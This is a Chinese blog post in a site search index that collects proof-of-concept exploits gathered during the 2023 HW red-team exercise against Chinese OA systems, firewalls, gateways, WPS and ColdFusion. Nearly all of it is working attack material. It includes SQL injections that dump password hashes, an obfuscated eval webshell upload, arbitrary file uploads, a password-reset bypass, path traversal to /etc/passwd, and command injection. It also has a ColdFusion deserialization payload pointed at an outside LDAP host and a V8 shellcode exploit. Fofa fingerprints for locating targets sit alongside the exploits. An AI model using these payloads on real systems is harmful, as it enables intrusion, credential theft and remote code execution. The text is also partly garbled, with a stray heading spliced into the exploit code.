<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2023护网期间漏洞合集</title>
      <link href="/2023/08/19/1/"/>
      <url>/2023/08/19/1/</url>
      
        <content type="html"><![CDATA[<h2 id="广联达oa-sql注入漏洞POC"><a href="#广联达oa-sql注入漏洞POC" class="headerlink" title="广联达oa sql注入漏洞POC"></a>广联达oa sql注入漏洞POC</h2><h5 id="资产特征"><a href="#资产特征" class="headerlink" title="资产特征"></a>资产特征</h5><p>鹰图：web.body&#x3D;“&#x2F;Services&#x2F;Identification&#x2F;Server&#x2F;”</p><p>fofa ：“&#x2F;Services&#x2F;Identification&#x2F;Server&#x2F;“或者fid&#x3D;”&#x2F;yV4r5PdARKT4jaqLjJYqw&#x3D;&#x3D;”</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;Webservice&#x2F;IM&#x2F;Config&#x2F;ConfigService.asmx&#x2F;GetIMDictionary HTTP&#x2F;1.1Host: xxx.comUpgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36(KHTML, like Gecko) Chrome&#x2F;115.0.0.0 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtmlxml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7Referer: http:&#x2F;&#x2F;xxx.com:8888&#x2F;Services&#x2F;Identification&#x2F;Server&#x2F;Incompatible.aspxAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Cookie:Connection: closeContent-Type: application&#x2F;x-www-form-urlencodedContent-Length: 88dasdas&#x3D;&amp;key&#x3D;1&#39; UNION ALL SELECT top 1812 concat(F_CODE,&#39;:&#39;,F_PWD_MD5) fromT_ORG_USER --<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="广联达oa-后台文件上传漏洞POC"><a href="#广联达oa-后台文件上传漏洞POC" class="headerlink" title="广联达oa 后台文件上传漏洞POC"></a>广联达oa 后台文件上传漏洞POC</h2><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;gtp&#x2F;im&#x2F;services&#x2F;group&#x2F;msgbroadcastuploadfile.aspx HTTP&#x2F;1.1Host: 10.10.10.1:8888X-Requested-With: Ext.basexAccept: text&#x2F;html, application&#x2F;xhtml+xml, image&#x2F;jxr, *&#x2F;*Accept-Language: zh-Hans-CN,zh-Hans;q&#x3D;0.5User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36(KHTML, like Gecko) Chrome&#x2F;107.0.0.0 Safari&#x2F;537.36Accept-Encoding: gzip, deflateContent-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryFfJZ4PlAZBixjELjAccept: *&#x2F;*Origin: http:&#x2F;&#x2F;10.10.10.1Referer: http:&#x2F;&#x2F;10.10.10.1:8888&#x2F;Workflow&#x2F;Workflow.aspx?configID&#x3D;774d99d7-02bf-42ec-9e27-caeaa699f512&amp;menuitemid&#x3D;120743&amp;frame&#x3D;1&amp;modulecode&#x3D;GTP.Workflow.TaskCenterModule&amp;tabID&#x3D;40Cookie:Connection: closeContent-Length: 421------WebKitFormBoundaryFfJZ4PlAZBixjELjContent-Disposition: form-data; filename&#x3D;&quot;1.aspx&quot;;filename&#x3D;&quot;1.jpg&quot;Content-Type: application&#x2F;text&lt;%@ Page Language&#x3D;&quot;Jscript&quot; Debug&#x3D;true%&gt;&lt;%var FRWT&#x3D;&#39;XeKBdPAOslypgVhLxcIUNFmStvYbnJGuwEarqkifjTHZQzCoRMWD&#39;;var GFMA&#x3D;Request.Form(&quot;qmq1&quot;);var ONOQ&#x3D;FRWT(19) + FRWT(20) + FRWT(8) + FRWT(6) + FRWT(21) + FRWT(1);eval(GFMA, ONOQ);%&gt;------WebKitFormBoundaryFfJZ4PlAZBixjELj--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="网神-SecGate-3600-防火墙-obj-app-upfile-任意文件上传漏洞-POC"><a href="#网神-SecGate-3600-防火墙-obj-app-upfile-任意文件上传漏洞-POC" class="headerlink" title="网神 SecGate 3600 防火墙 obj_app_upfile 任意文件上传漏洞 POC"></a>网神 SecGate 3600 防火墙 obj_app_upfile 任意文件上传漏洞 POC</h2><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;?g&#x3D;obj_app_upfile HTTP&#x2F;1.1Host: x.x.x.x   &#x2F;&#x2F;攻击的网站域名或者ipAccept: *&#x2F;*Accept-Encoding: gzip, deflateContent-Length: 574Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryJpMyThWnAxbcBBQcUser-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident&#x2F;4.0)------WebKitFormBoundaryJpMyThWnAxbcBBQcContent-Disposition: form-data; name&#x3D;&quot;MAX_FILE_SIZE&quot;10000000------WebKitFormBoundaryJpMyThWnAxbcBBQcContent-Disposition: form-data; name&#x3D;&quot;upfile&quot;; filename&#x3D;&quot;vulntest.php&quot;Content-Type: text&#x2F;plain&lt;?php php马?&gt;------WebKitFormBoundaryJpMyThWnAxbcBBQcContent-Disposition: form-data; name&#x3D;&quot;submit_post&quot;obj_app_upfile------WebKitFormBoundaryJpMyThWnAxbcBBQcContent-Disposition: form-data; name&#x3D;&quot;__hash__&quot;0b9d6b1ab7479ab69d9f71b05e0e9445------WebKitFormBoundaryJpMyThWnAxbcBBQc--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">马儿路径：attachements&#x2F;xxx.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="网神-SecSSL-3600安全接入网关系统-任意密码修改漏洞-POC"><a href="#网神-SecSSL-3600安全接入网关系统-任意密码修改漏洞-POC" class="headerlink" title="网神 SecSSL 3600安全接入网关系统 任意密码修改漏洞 POC"></a>网神 SecSSL 3600安全接入网关系统 任意密码修改漏洞 POC</h2><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;changepass.php?type&#x3D;2Cookie: admin_id&#x3D;1; gw_user_ticket&#x3D;ffffffffffffffffffffffffffffffff;last_step_param&#x3D;&#123;&quot;this_name&quot;:&quot;test&quot;,&quot;subAuthId&quot;:&quot;1&quot;&#125;old_pass&#x3D;&amp;password&#x3D;Test123!@&amp;repassword&#x3D;Test123!@<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="泛微-OA-代码执行-EXP"><a href="#泛微-OA-代码执行-EXP" class="headerlink" title="泛微 OA 代码执行 EXP"></a>泛微 OA 代码执行 EXP</h2><p>描述和影响范围<br>Weaver E-Office9版本存在代码问题漏洞，该漏洞源于文件&#x2F;inc&#x2F;jquery&#x2F;uploadify&#x2F;uploadify.php存在问<br>题，对参数Filedata的操作会导致不受限制的上传。<br>Weaver E-Office9.0</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;inc&#x2F;jquery&#x2F;uploadify&#x2F;uploadify.php HTTP&#x2F;1.1Host: 192.168.232.137:8082User-Agent: testConnection: closeContent-Length: 493Accept-Encoding: gzipContent-Type: multipart&#x2F;form-data;boundary&#x3D;25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85Content-Disposition: form-data; name&#x3D;&quot;Filedata&quot;; filename&#x3D;&quot;666.php&quot;Content-Type: application&#x2F;octet-stream&lt;?php phpinfo();?&gt;--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85----25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;&quot;Content-Type: application&#x2F;octet-stream--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="通达OA（CVE-2023-4166）"><a href="#通达OA（CVE-2023-4166）" class="headerlink" title="通达OA（CVE-2023-4166）"></a>通达OA（CVE-2023-4166）</h2><p>描述-影响范围</p><p>通达OA</p><p>是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是适合各个行业用户的综合管理办公</p><p>平台</p><p>本次范围：通达OA版本11.10之前</p><pre class="line-numbers language-none"><code class="language-none">GET &#x2F;general&#x2F;system&#x2F;seal_manage&#x2F;dianju&#x2F;delete_log.php?DELETE_STR&#x3D;1)%20and%20(substr(DATABASE(),1,1))&#x3D;char(84)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)&#x3D;(1 HTTP&#x2F;1.1Host: 192.168.232.137:8098User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko&#x2F;20100101Firefox&#x2F;116.0Accept:text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateConnection: closeCookie: PHPSESSID&#x3D;1u7tsd1cpgp9qvco726smb50h5; USER_NAME_COOKIE&#x3D;admin;OA_USER_ID&#x3D;admin; SID_1&#x3D;779f3f46Upgrade-Insecure-Requests: 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="泛微-Weaver-E-Office9-前台文件包含"><a href="#泛微-Weaver-E-Office9-前台文件包含" class="headerlink" title="泛微 Weaver E-Office9 前台文件包含"></a>泛微 Weaver E-Office9 前台文件包含</h2><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;URL&#x2F;E-mobile&#x2F;App&#x2F;Init.php?weiApi&#x3D;1&amp;sessionkey&#x3D;ee651bec023d0db0c233fcb562ec7673_admin&amp;m&#x3D;12344554_..&#x2F;..&#x2F;attachment&#x2F;xxx.xls<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="金山WPS-RCE"><a href="#金山WPS-RCE" class="headerlink" title="金山WPS RCE"></a>金山WPS RCE</h2><p>wps影响范围为：WPS Office 2023 个人版 &lt; 11.1.0.15120</p><p>WPS Office 2019 企业版 &lt; 11.8.2.12085</p><p>POC</p><p>在1.html当前路径下启动http server并监听80端口，修改hosts文件（测试写死的）</p><pre class="line-numbers language-none"><code class="language-none">127.0.0.1 clientweb.docer.wps.cn.cloudwps.cn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>漏洞触发需让域名规则满足clientweb.docer.wps.cn.{xxxxx}wps.cn cloudwps.cn和wps.cn没有任何关</p><p>系</p><p>代码块在底下。（需要原pdf加wechat）</p><pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;if(typeof alert &#x3D;&#x3D;&#x3D; &quot;undefined&quot;)&#123;alert &#x3D; console.log;&#125;let f64 &#x3D; new Float64Array(1);let u32 &#x3D; new Uint32Array(f64.buffer);function d2u(v) &#123;f64[0] &#x3D; v;return u32;&#125;function u2d(lo, hi) &#123;u32[0] &#x3D; lo;u32[1] &#x3D; hi;return f64[0];&#125;function gc()&#123; &#x2F;&#x2F; majorfor (let i &#x3D; 0; i &lt; 0x10; i++) &#123;new Array(0x100000);&#125;&#125;function foo(bug) &#123;function C(z) &#123;Error.prepareStackTrace &#x3D; function(t, B) &#123;return B[z].getThis();&#125;;let p &#x3D; Error().stack;Error.prepareStackTrace &#x3D; null;return p;&#125;function J() &#123;&#125;var optim &#x3D; false;var opt &#x3D; new Function(&#39;a&#39;, &#39;b&#39;, &#39;c&#39;,&#39;if(typeof a&#x3D;&#x3D;&#x3D;\&#39;number\&#39;)&#123;if(a&gt;2)&#123;for(vari&#x3D;0;i&lt;100;i++);return;&#125;b.d(a,b,1);return&#125;&#39; +&#39;g++;&#39;.repeat(70));var e &#x3D; null;J.prototype.d &#x3D; new Function(&#39;a&#39;, &#39;b&#39;, &#39;&quot;use strict&quot;;b.a.call(arguments,b);return arguments[a];&#39;);J.prototype.a &#x3D; new Function(&#39;a&#39;, &#39;a.b(0,a)&#39;);J.prototype.b &#x3D; new Function(&#39;a&#39;, &#39;b&#39;,&#39;b.c();if(a)&#123;&#39; +&#39;g++;&#39;.repeat(70) + &#39;&#125;&#39;);J.prototype.c &#x3D; function() &#123;if (optim) &#123;var z &#x3D; C(3);var p &#x3D; C(3);z[0] &#x3D; 0;e &#x3D; &#123;M: z, C: p&#125;;&#125;&#125;;var a &#x3D; new J();&#x2F;&#x2F; jit optimif (bug) &#123;for (var V &#x3D; 0; 1E4 &gt; V; V++) &#123;opt(0 &#x3D;&#x3D; V % 4 ? 1 : 4, a, 1);&#125;&#125;optim &#x3D; true;opt(1, a, 1);return e;&#125;e1 &#x3D; foo(false);e2 &#x3D; foo(true);delete e2.M[0];let hole &#x3D; e2.C[0];let map &#x3D; new Map();map.set(&#39;asd&#39;, 8);map.set(hole, 0x8);map.delete(hole);map.delete(hole);map.delete(&quot;asd&quot;);map.set(0x20, &quot;aaaa&quot;);let arr3 &#x3D; new Array(0);let arr4 &#x3D; new Array(0);let arr5 &#x3D; new Array(1);let oob_array &#x3D; [];oob_array.push(1.1);map.set(&quot;1&quot;, -1);let obj_array &#x3D; &#123;m: 1337, target: gc&#125;;let ab &#x3D; new ArrayBuffer(1337);let object_idx &#x3D; undefined;let object_idx_flag &#x3D; undefined;let max_size &#x3D; 0x1000;for (let i &#x3D; 0; i &lt; max_size; i++) &#123;if (d2u(oob_array[i])[0] &#x3D;&#x3D;&#x3D; 0xa72) &#123;object_idx &#x3D; i;object_idx_flag &#x3D; 1;break;&#125;if (d2u(oob_array[i])[1] &#x3D;&#x3D;&#x3D; 0xa72) &#123;object_idx &#x3D; i + 1;object_idx_flag &#x3D; 0;break;&#125;&#125;function addrof(obj_para) &#123;obj_array.target &#x3D; obj_para;let addr &#x3D; d2u(oob_array[object_idx])[object_idx_flag] - 1;obj_array.target &#x3D; gc;return addr;&#125;function fakeobj(addr) &#123;let r8 &#x3D; d2u(oob_array[object_idx]);if (object_idx_flag &#x3D;&#x3D;&#x3D; 0) &#123;oob_array[object_idx] &#x3D; u2d(addr, r8[1]);&#125;else &#123;oob_array[object_idx] &#x3D; u2d(r8[0], addr);&#125;return obj_array.target;&#125;let bk_idx &#x3D; undefined;let bk_idx_flag &#x3D; undefined;for (let i &#x3D; 0; i &lt; max_size; i++) &#123;if (d2u(oob_array[i])[0] &#x3D;&#x3D;&#x3D; 1337) &#123;bk_idx &#x3D; i;bk_idx_flag &#x3D; 1;break;&#125;if (d2u(oob_array[i])[1] &#x3D;&#x3D;&#x3D; 1337) &#123;bk_idx &#x3D; i + 1;bk_idx_flag &#x3D; 0;break;&#125;&#125;let dv &#x3D; new DataView(ab);function get_32(addr) &#123;let r8 &#x3D; d2u(oob_array[bk_idx]);if (bk_idx_flag &#x3D;&#x3D;&#x3D; 0) &#123;oob_array[bk_idx] &#x3D; u2d(addr, r8[1]);&#125; else &#123;oob_array[bk_idx] &#x3D; u2d(r8[0], addr);&#125;let val &#x3D; dv.getUint32(0, true);oob_array[bk_idx] &#x3D; u2d(r8[0], r8[1]);return val;&#125;function set_32(addr, val) &#123;let r8 &#x3D; d2u(oob_array[bk_idx]);if (bk_idx_flag &#x3D;&#x3D;&#x3D; 0) &#123;oob_array[bk_idx] &#x3D; u2d(addr, r8[1]);&#125; else &#123;oob_array[bk_idx] &#x3D; u2d(r8[0], addr);&#125;dv.setUint32(0, val, true);oob_array[bk_idx] &#x3D; u2d(r8[0], r8[1]);&#125;function write8(addr, val) &#123;let r8 &#x3D; d2u(oob_array[bk_idx]);if (bk_idx_flag &#x3D;&#x3D;&#x3D; 0) &#123;oob_array[bk_idx] &#x3D; u2d(addr, r8[1]);&#125; else &#123;绿盟sas安全审计系统任意文件读取漏洞sxf-报表 版本有限制 7.0.8-7.0.8R5oob_array[bk_idx] &#x3D; u2d(r8[0], addr);&#125;dv.setUint8(0, val);&#125;let fake_length &#x3D; get_32(addrof(oob_array)+12);set_32(get_32(addrof(oob_array)+8)+4,fake_length);let wasm_code &#x3D; newUint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);let wasm_mod &#x3D; new WebAssembly.Module(wasm_code);let wasm_instance &#x3D; new WebAssembly.Instance(wasm_mod);let f &#x3D; wasm_instance.exports.main;let target_addr &#x3D; addrof(wasm_instance)+0x40;let rwx_mem &#x3D; get_32(target_addr);&#x2F;&#x2F;alert(&quot;rwx_mem is&quot;+rwx_mem.toString(16));const shellcode &#x3D; new Uint8Array([0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89,0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30,0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14,0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff,0xac, 0x3c, 0x61, 0x7c,0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2, 0x52,0x57, 0x8b,0x52, 0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48, 0x01,0xd1,0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49,0x8b, 0x34, 0x8b,0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7,0x38, 0xe0, 0x75, 0xf6, 0x03,0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe4, 0x58,0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b,0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01,0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24,0x24, 0x5b, 0x5b, 0x61,0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a, 0x8b, 0x12, 0xeb,0x8d, 0x5d,0x6a, 0x01, 0x8d, 0x85, 0xb2, 0x00, 0x00, 0x00, 0x50, 0x68, 0x31, 0x8b,0x6f,0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x68, 0xa6, 0x95, 0xbd,0x9d, 0xff, 0xd5,0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,0x47, 0x13, 0x72, 0x6f, 0x6a,0x00, 0x53, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63,0x00]);for(let i&#x3D;0;i&lt;shellcode.length;i++)&#123;write8(rwx_mem+i,shellcode[i]);&#125;f();&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="绿盟sas安全审计系统任意文件读取漏洞"><a href="#绿盟sas安全审计系统任意文件读取漏洞" class="headerlink" title="绿盟sas安全审计系统任意文件读取漏洞"></a>绿盟sas安全审计系统任意文件读取漏洞</h2><pre class="line-numbers language-none"><code class="language-none">&#x2F;webconf&#x2F;GetFile&#x2F;indexpath&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="sxf-报表-版本有限制-7-0-8-7-0-8R5"><a href="#sxf-报表-版本有限制-7-0-8-7-0-8R5" class="headerlink" title="sxf-报表 版本有限制 7.0.8-7.0.8R5"></a>sxf-报表 版本有限制 7.0.8-7.0.8R5</h2><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;rep&#x2F;login HTTP&#x2F;1.1Host:Cookie:User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac 0s X 10.15: ry:109.0)Gecko&#x2F;20100101Firefox&#x2F;115.0Accept:text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;g&#x3D;0,9, image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8Accept-Language:zh-CN, zh;g&#x3D;0.8, zh-TW;g&#x3D;0.7, zh-HK;g&#x3D;0.5,en-US;g&#x3D;0.3,en;g&#x3D;0.2Accept-Encoding: gzip deflateUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: cross-sitePragma: no-cacheCache-Control: no-cache14Te: trailersConnection: closeContent-Type:application&#x2F;x-www-form-urlencodedContent-Length: 126clsMode&#x3D;cls_mode_login&amp;index&#x3D;index&amp;log_type&#x3D;report&amp;page&#x3D;login&amp;rnd&#x3D;0.7550103466497915&amp;userID&#x3D;admin%0Aid -a %0A&amp;userPsw&#x3D;tmbhuisq<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="任我行-CRM-sql注入"><a href="#任我行-CRM-sql注入" class="headerlink" title="任我行 CRM sql注入"></a>任我行 CRM sql注入</h2><p>SmsDataList 接口处存在SQL注入漏洞，未经身份认证的攻击者可通过该漏洞获取数据库敏感信息及凭证，最终可能导致服务器失陷。</p><p><img src="/2023/08/19/1/1.png"> </p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;SMS&#x2F;SmsDataList&#x2F;?pageIndex&#x3D;1&amp;pageSize&#x3D;30 HTTP&#x2F;1.1Host: User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;57.0.1361.63 Safari&#x2F;537.36Accept-Encoding: gzip, deflateAccept: *&#x2F;*Connection: closeContent-Type: application&#x2F;x-www-form-urlencodedContent-Length: 170Keywords&#x3D;&amp;StartSendDate&#x3D;2023-07-17&amp;EndSendDate&#x3D;2023-08-10&amp;SenderTypeId&#x3D;0000000000*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Adobe-ColdFusion-反序列化漏洞（CVE-2023-29300）"><a href="#Adobe-ColdFusion-反序列化漏洞（CVE-2023-29300）" class="headerlink" title="Adobe ColdFusion 反序列化漏洞（CVE-2023-29300）"></a>Adobe ColdFusion 反序列化漏洞（CVE-2023-29300）</h2><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;CFIDE&#x2F;adminapi&#x2F;base.cfc?method&#x3D; HTTP&#x2F;1.1Host: 1.2.3.4:1234User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit&#x2F;605.1.15 (KHTML, like Gecko) Version&#x2F;12.0.3 Safari&#x2F;605.1.15Content-Length: 400Content-Type: application&#x2F;x-www-form-urlencodedAccept-Encoding: gzipcmd: idargumentCollection&#x3D;&lt;wddxPacket version&#x3D;&#39;1.0&#39;&gt;    &lt;header&#x2F;&gt;    &lt;data&gt;        &lt;struct type&#x3D;&#39;xcom.sun.rowset.JdbcRowSetImplx&#39;&gt;            &lt;var name&#x3D;&#39;dataSourceName&#39;&gt;                &lt;string&gt;ldap:&#x2F;&#x2F;xxx.xxx.xxx:1234&#x2F;Basic&#x2F;TomcatEcho&lt;&#x2F;string&gt;            &lt;&#x2F;var&gt;            &lt;var name&#x3D;&#39;autoCommit&#39;&gt;                &lt;boolean value&#x3D;&#39;true&#39;&#x2F;&gt;            &lt;&#x2F;var&gt;        &lt;&#x2F;struct&gt;    &lt;&#x2F;data&gt;&lt;&#x2F;wddxPacket&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Coremail-邮件系统未授权访问获取管理员账密"><a href="#Coremail-邮件系统未授权访问获取管理员账密" class="headerlink" title="Coremail 邮件系统未授权访问获取管理员账密"></a>Coremail 邮件系统未授权访问获取管理员账密</h2><h5 id="poc"><a href="#poc" class="headerlink" title="poc:"></a>poc:</h5><pre class="line-numbers language-none"><code class="language-none">&#x2F;coremail&#x2F;common&#x2F;assets&#x2F;;l;&#x2F;;&#x2F;;&#x2F;;&#x2F;;&#x2F;s?biz&#x3D;Mzl3MTk4NTcyNw&#x3D;&#x3D;&amp;mid&#x3D;2247485877&amp;idx&#x3D;1&amp;sn&#x3D;7e5f77db320ccf9013c0b7aa72626e68&amp;chksm&#x3D;eb3834e5dc4fbdf3a9529734de7e6958e1b7efabecd1c1b340c53c80299ff5c688bf6adaed61&amp;scene&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="移动管理系统-uploadApk-do-任意文件上传漏洞"><a href="#移动管理系统-uploadApk-do-任意文件上传漏洞" class="headerlink" title="移动管理系统 uploadApk.do 任意文件上传漏洞"></a>移动管理系统 uploadApk.do 任意文件上传漏洞</h2><h5 id="poc："><a href="#poc：" class="headerlink" title="poc："></a>poc：</h5><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;maportal&#x2F;appmanager&#x2F;uploadApk.do?pk_obj&#x3D; HTTP&#x2F;1.1Host: xxx.xxx.xxx.xxx:portContent-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryvLTG6zlX0gZ8LzO3User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;114.0.0.0 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7Cookie: JSESSIONID&#x3D;4ABE9DB29CA45044BE1BECDA0A25A091.serverConnection: close------WebKitFormBoundaryvLTG6zlX0gZ8LzO3Content-Disposition: form-data; name&#x3D;&quot;downloadpath&quot;; filename&#x3D;&quot;a.jsp&quot;Content-Type: application&#x2F;mswordhello  &#x2F;&#x2F;可以替换成木马<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="大华智慧园区综合管理平台"><a href="#大华智慧园区综合管理平台" class="headerlink" 